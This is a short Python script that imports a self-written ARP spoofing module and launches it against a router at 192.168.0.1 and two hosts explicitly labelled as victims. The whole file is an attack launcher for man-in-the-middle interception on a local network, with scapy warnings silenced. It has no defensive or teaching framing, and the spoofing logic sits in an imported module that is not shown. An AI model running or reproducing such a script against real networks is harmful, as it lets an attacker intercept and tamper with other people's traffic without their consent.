# -*- coding: utf-8 -*- python3
# Created At 2017.9.24
# By R3turn0927
# Github @return0927 | Facebook @R3turn.01 | KakakoTalk @bc1916


from _ARP_Module import _ARP # ARP Spoofing Module (Self)
import os
import logging # Error Logger

# Logger SET => Error Handling
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

ARP = _ARP()

ARP.run(
    routerIP = "192.168.0.1",
    victimIPs = [
        "192.168.0.224",
        "192.168.0.2"
    ]
)